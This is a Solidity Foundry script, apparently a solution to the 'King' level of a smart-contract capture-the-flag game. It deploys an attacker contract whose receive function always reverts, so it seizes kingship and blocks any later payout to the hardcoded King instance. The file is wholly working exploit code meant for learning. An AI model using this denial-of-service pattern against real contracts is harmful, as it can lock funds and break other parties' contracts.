// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../src/King.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";

contract Attack {
    receive() external payable {
        revert();
    }

    constructor() payable {
        King king = King(payable(0xAA637F5DF9321349173b6C40F545D21cdB740f99));
        address(king).call{value: 0.0015 ether}("");
    }
}

contract Level9KingSolution is Script {
    King public instance = King(payable(0xAA637F5DF9321349173b6C40F545D21cdB740f99));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack{value: 0.0016 ether}();
        console.log("balance: ", address(instance).balance);
        console.log("address: ", address(attack));
        console.log("owner: ", instance._king());

        vm.stopBroadcast();
    }
}
